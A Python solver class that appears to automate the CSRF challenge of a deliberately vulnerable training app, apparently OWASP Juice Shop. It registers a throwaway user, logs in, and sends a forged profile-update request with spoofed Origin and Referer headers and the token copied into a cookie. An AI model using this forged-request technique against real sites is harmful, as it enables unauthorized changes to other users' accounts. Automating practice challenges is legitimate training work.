from core.base_solver import BaseSolver
from loguru import logger
import random

class CsrfSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "csrfChallenge"

    def solve(self) -> bool:
        # 1. Login with a distinct user for CSRF
        email = f"csrf_{random.randint(1000, 9999)}@test.com"
        reg_payload = {
            "email": email,
            "password": "password123",
            "passwordRepeat": "password123",
            "securityQuestion": {"id": 1, "answer": "answer"}
        }
        self.client.post("/api/Users", json=reg_payload)
        
        login_res = self.client.post("/rest/user/login", json={"email": email, "password": "password123"})
        token = login_res.json().get("authentication", {}).get("token")
        if not token: return False
        
        # 2. Forge request
        headers = {
            "Authorization": f"Bearer {token}",
            "Cookie": f"token={token}", # Crucial: verify check uses req.cookies.token
            "Origin": "http://htmledit.squarefree.com",
            "Referer": "http://htmledit.squarefree.com"
        }
        payload = {"username": "csrf-attack-success"}
        
        # Endpoint: /profile
        res = self.client.post("/profile", json=payload, headers=headers)
        return res.status_code == 200 or res.status_code == 302
